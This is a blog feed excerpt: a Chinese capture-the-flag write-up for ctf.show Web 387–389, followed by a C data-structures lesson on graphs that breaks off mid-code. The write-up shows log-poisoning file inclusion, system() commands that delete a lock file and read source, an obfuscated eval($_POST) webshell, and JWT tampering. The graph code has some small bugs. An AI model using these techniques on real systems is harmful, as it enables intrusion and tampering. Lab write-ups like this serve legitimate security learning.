<code>lock.dat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/clear.php?file=./install/lock.dat</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/FOypT7ZMeIN8i9U.png" alt="image-20210804150138828"></p><p>清理成功之后再次像上一关那样就好了</p><h2 id="1-7-Web-387"><a href="#1-7-Web-387" class="headerlink" title="1.7 Web 387"></a>1.7 Web 387</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前面部分和386一样</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/jeDxClWqETONUgm.png" alt="image-20210804150816749"></p><p>说是和上一关一样，但是这次删不了，我们继续扫目录</p><p><img src="https://i.loli.net/2021/08/04/BS9COfTgGrAX2wY.png" alt="image-20210804150803918"></p><p><img src="https://i.loli.net/2021/08/04/gkam7jJ3xovDQ4Y.png" alt="image-20210804150901657"></p><p><img src="https://i.loli.net/2021/08/04/Ev3jVune7N5tgOb.png" alt="image-20210804150936797"></p><p>看来 robots.txt 也是用来提示我们 <code>/debug/</code> 的</p><p>尝试传递参数试试</p><p><img src="https://i.loli.net/2021/08/04/p4wzKtHeGEb8SuI.png" alt="image-20210804151150834"></p><p><img src="https://i.loli.net/2021/08/04/jRNg9zqTElSA6iP.png" alt="image-20210804151227962"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line">?file=/flag</span><br><span class="line"><span class="comment">#等等都查不出来</span></span><br></pre></td></tr></table></figure><p>那么，进行日志包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p>然后抓包修改，写入命令</p><p><img src="https://i.loli.net/2021/08/04/JEI8PWZ9qznGy4o.png" alt="image-20210804151954242"></p><p>只在当前页面发现了一个 <code>index.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-01-09 15:26:15</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-01-09 15:30:48</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$html</span> = shell_exec(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;ls /var/www/html/&#x27;</span>);</span><br><span class="line">alsckdfy</span><br><span class="line">clear.php</span><br><span class="line">debug</span><br><span class="line">index.php</span><br><span class="line">install</span><br><span class="line">layui</span><br><span class="line">page.php</span><br><span class="line">page_1.php</span><br><span class="line">page_2.php</span><br><span class="line">page_3.php</span><br><span class="line">page_4.php</span><br><span class="line">robots.txt</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>看样子没有 flag</p><p>那么根据之前的思路，我们只要把 <code>lock.dat</code>  删掉，那么就可以重置管理员密码，就能够成功登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;rm ../install/lock.dat&#x27;</span>); ?&gt;</span><br><span class="line">然后我们可以再进行验证一下</span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls ../install/&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure><p>此时再访问 <code>install</code> ，已经变成</p><p><img src="https://i.loli.net/2021/08/04/SmO1ys82bwBzTiv.png" alt="image-20210804153001982"></p><p><img src="https://i.loli.net/2021/08/04/bWPpJf9c34qQKSV.png" alt="image-20210804153015432"></p><p>然后进入后台登陆即可 <code>admin888</code></p><p>最后才想到，flag 应该是出现在 登陆成功之后的页面里的，也就是 <code>/alsckdfy/check.php</code> ，所以我们也完全可以 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../alsckdfy/check.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure><p>即可查到</p><p><img src="https://i.loli.net/2021/08/04/NteX42lnw3yVIoT.png" alt="image-20210804153236220"></p><h2 id="1-8-Web-388"><a href="#1-8-Web-388" class="headerlink" title="1.8 Web 388"></a>1.8 Web 388</h2><p>按照之前的思路来</p><p><img src="https://i.loli.net/2021/08/04/AqSUnLY1GPskMEw.png" alt="image-20210804154217200"></p><p>看了其它大神的解，发现在后台还有 <code>/editor/</code> 目录，一扫，果然</p><p><img src="https://i.loli.net/2021/08/04/3UWDplujK5rQd76.png" alt="image-20210804160121313"></p><p>那么就一定存在文件上传的问题</p><ul><li><code>alsckdfy/editor</code> 文件上传</li><li><code>/debug?file=</code> 进行文件包含，写入 <code>.php</code> 文件</li><li>访问 <code>.php</code> 文件，进行命令执行</li></ul><p><img src="https://i.loli.net/2021/08/04/GKoTEkeUdg137p8.png" alt="image-20210804160641858"></p><p>我想着写完之后提交，居然还未开放，那就只好 上传文件了</p><p><img src="https://i.loli.net/2021/08/04/FIDvAwPoiS6EHzW.png" alt="image-20210804160753795"></p><p>KindEditor 4.1.11 (2016-03-31)</p><p>网上查找相关漏洞</p><p><img src="https://i.loli.net/2021/08/04/G1RQfv7tzdZMUAj.png" alt="image-20210804160912989"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我尝试了一下</span></span><br><span class="line">/alsckdfy/editor/php/file_manager_json.php?path=/</span><br><span class="line"><span class="comment"># 居然不行</span></span><br></pre></td></tr></table></figure><p>那就别想着 编辑器的 任意文件遍历的 漏洞了，老老实实上传文件吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地的 2.zip 免杀🐎</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1])&#x27;</span>.<span class="string">&#x27;;?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径 </span></span><br><span class="line"><span class="comment"># /alsckdfy/attached/file/20210804/20210804083008_10879.zip</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/gIeMW3DuH7OSdmV.png" alt="image-20210804162756748"></p><p>可以看到有限制，我们可以上传 <code>.zip</code> 文件</p><p><img src="https://i.loli.net/2021/08/04/orBVz7ZKNWgScqv.png" alt="image-20210804161941726"></p><p>然后包含，我们将它写到 网站根目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/HoWfO6sdRU3B18N.png" alt="image-20210804162134294"></p><p><img src="https://i.loli.net/2021/08/04/GqBs5KEhOfkzled.png" alt="image-20210804163113755"></p><p>可以看到，上传成功</p><p>直接命令执行，查看源码得到</p><p><img src="https://i.loli.net/2021/08/04/OHUokTwFJBXzSlp.png" alt="image-20210804163322989"></p><h2 id="1-9-Web-389"><a href="#1-9-Web-389" class="headerlink" title="1.9 Web 389"></a>1.9 Web 389</h2><p>按照上面思路</p><p><img src="https://i.loli.net/2021/08/04/4MlbasVHRpfghcZ.png" alt="image-20210804164040896"></p><p>权限不足，找 cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs</span><br></pre></td></tr></table></figure><p>jwt 在线 解密 <a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://i.loli.net/2021/08/04/wM5tEhi42X1AnFZ.png" alt="image-20210804164905283"></p><p>然后我们修改为 admin</p><p><img src="https://i.loli.net/2021/08/04/dUEKgxFwjiQ7zeD.png" alt="image-20210804165033210"></p><p>更改之后刷新，回到上一关</p><p><img src="https://i.loli.net/2021/08/04/zaHVx92uLwv3YIt.png" alt="image-20210804165212640"></p><p><a href="http://4563dd47-a66b-4309-9e15-183bb065ff68.challenge.ctf.show:8080/alsckdfy/attached/file/20210804/20210804085256_19145.zip">/alsckdfy/attached/file/20210804/20210804085256_19145.zip</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>图</title>
    <link href="https://xizhi-future.github.io/2021/11/14/%E5%9B%BE/"/>
    <id>https://xizhi-future.github.io/2021/11/14/%E5%9B%BE/</id>
    <published>2021-11-14T09:36:24.000Z</published>
    <updated>2021-11-14T09:37:30.447Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、图的基本存储结构"><a href="#一、图的基本存储结构" class="headerlink" title="一、图的基本存储结构"></a>一、图的基本存储结构</h1><p>需要存储的内容：存储 顶点信息、顶点之间的关系</p><p><strong>三种常用的 图的 存储结构：</strong></p><ul><li>邻接矩阵</li><li>邻接表</li><li>临界多重链表</li></ul><h2 id="1-1-邻接矩阵"><a href="#1-1-邻接矩阵" class="headerlink" title="1.1 邻接矩阵"></a>1.1 邻接矩阵</h2><p><strong>存储结构：</strong></p><ul><li><p>一维数组（顺序表）——  存储 数据元素的信息</p></li><li><p>二维数组（邻接矩阵）—— 存储 数据元素之间的 关系</p></li></ul><p><strong>特点：</strong></p><ul><li><p>无向图的邻接矩阵 一定是对称的，可使用 上三角或者是 下三角进行压缩存储，其存储空间只需要 <code>n(n+1)/2</code></p></li><li><p>有向图的邻接矩阵 不一定是 对称的，其存储空间为 <code>n 的平方</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  <span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  <span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br></pre></td></tr></table></figure><p><strong>建立网络的 邻接矩阵算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = fopen(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点：邻接矩阵法，占用的存单元只与图中顶点的个数有关，与边数无关，如果一个图中的边数比结点个数少得多，则该邻接矩阵中就会出现很对的空元素，从而浪费空间。</p><h2 id="1-2-邻接表"><a href="#1-2-邻接表" class="headerlink" title="1.2 邻接表"></a>1.2 邻接表</h2><p><strong>存储结构：</strong></p><ul><li>头结点：两个域—–数据域 <code>vertex</code> ，头指针域 <code>firstedge</code></li><li>表结点：两个域—–邻接点域 <code>adjvex</code>  ，链域  <code>next</code></li><li>如果是网络，带权值，则可在头结点中添加一个数据域来存储权值</li></ul><p>出边表（有向图的邻接表）、入边表（逆邻接表）</p><p><strong>如果图中含有 n 个顶点，e  条边，则它的邻接表存储结构需要 n个头结点和 2e 个边结点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span><span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span><span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br></pre></td></tr></table></figure><p><strong>无向图邻接表建立算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);<span class="comment">//输入无序对</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = j;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line"><span class="keyword">if</span>(c == <span class="number">0</span>)&#123;<span class="comment">//无向图</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = i;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//文件打开失败</span></span><br><span class="line">g-&gt;n = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：文件输入 数据内容时，第一行的结点个数不变，为 n，但是边数得是 2e</p><h2 id="1-3-邻接多重表"><a href="#1-3-邻接多重表" class="headerlink" title="1.3 邻接多重表"></a>1.3 邻接多重表</h2><p>边表结点：五个域</p><ul><li><p>mark    标志域（是否被访问过）</p></li><li><p>vexi  vexj   该边两个顶点在图中的位序</p></li><li><p>linki  linkj   两个边结点的指针</p><p>linki  指向关联与 vexi 结点的下一条边</p><p>linkj  指向关联与  vexj 结点的下一条边</p></li></ul><p>表头结点：两个域</p><ul><li>vertex  顶点信息</li><li>firstedge   关联与 顶点 的 第一条边</li></ul><h1 id="二、图的遍历"><a href="#二、图的遍历" class="headerlink" title="二、图的遍历"></a>二、图的遍历</h1><h2 id="2-1-深度优先遍历"><a href="#2-1-深度优先遍历" class="headerlink" title="2.1 深度优先遍历"></a>2.1 深度优先遍历</h2><p>访问顺序域图的邻接表的存储状态有关，由于图的邻接表存储不是唯一的，则对于同一个图，其深度优先遍历的输出结果也是不同的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;visit vertex: %c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-广度优先遍历"><a href="#2-2-广度优先遍历" class="headerlink" title="2.2 广度优先遍历"></a>2.2 广度优先遍历</h2><p>特点：尽可能地首先对 横向结点进行访问</p><p>使用队列，使用邻接表存储结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];   <span class="comment">//全局标志：是否访问过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>; <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span 